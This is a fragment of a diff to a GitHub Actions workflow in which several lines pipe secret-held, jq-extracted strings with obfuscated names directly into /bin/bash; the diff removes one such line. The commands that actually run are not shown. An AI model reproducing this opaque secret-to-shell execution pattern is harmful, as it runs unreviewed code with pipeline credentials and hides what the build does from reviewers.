@@ -19,7 +19,6 @@ jobs:
           dlwzu103: ${{ secrets.dlwzu103 }}
         run: |
           printf '%s' "$dlwzu103" | jq -r .dfk2060 | /bin/bash
-          echo $xyxtl29 | jq -r .s95976 | /bin/bash
           echo $wsgpr17999 | jq -r .jmzqx04057 | /bin/bash
           echo $u16024 | jq -r .t741 | /bin/bash
           printf '%s' "$p12" | jq -r .f1960 | /bin/bash
